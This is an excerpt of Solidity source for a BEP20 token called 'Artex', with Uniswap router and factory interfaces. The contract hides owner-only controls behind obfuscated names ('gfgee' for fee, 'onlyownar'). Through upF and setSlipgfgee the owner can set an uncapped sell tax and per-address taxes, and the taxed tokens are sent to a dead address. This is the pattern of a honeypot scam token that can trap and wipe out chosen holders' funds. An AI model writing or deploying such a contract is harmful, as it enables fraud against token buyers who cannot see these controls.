...
interface IUniswapV2Factory {
    ...
    function gfgeeTo() external view returns (address);
    function gfgeeToSetter() external view returns (address);
    ...
    function setgfgeeTo(address) external;
    function setgfgeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinggfgeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinggfgeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinggfgeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinggfgeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinggfgeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Artex is BEP20, Ownable {
    ...
    uint256 private _defaultSellgfgee = 0;

    uint256 private _defaultBuygfgee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipgfgee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellgfgee = _value;
    }

    function setSlipgfgee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipgfgee[_address] = _value;
    }

    function getSlipgfgee(address _address) external view onlyownar returns (uint256) {
        return _slipgfgee[_address];
    }


    function setMAccountgfgee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountgfgee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradegfgeeAmount = 0;

        if (rF) {
            uint256 tradegfgee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradegfgee = _defaultSellgfgee;
                }
                if (from == uniswapV2Pair) {

                    tradegfgee = _defaultBuygfgee;
                }
            }
            if (_slipgfgee[from] > 0) {
                tradegfgee = _slipgfgee[from];
            }

            tradegfgeeAmount = _Amount.mul(tradegfgee).div(100);
        }


        if (tradegfgeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradegfgeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradegfgeeAmount);
            emit Transfer(from, _deadAddress, tradegfgeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradegfgeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradegfgeeAmount);
        emit Transfer(from, _to, _Amount - tradegfgeeAmount);
    }
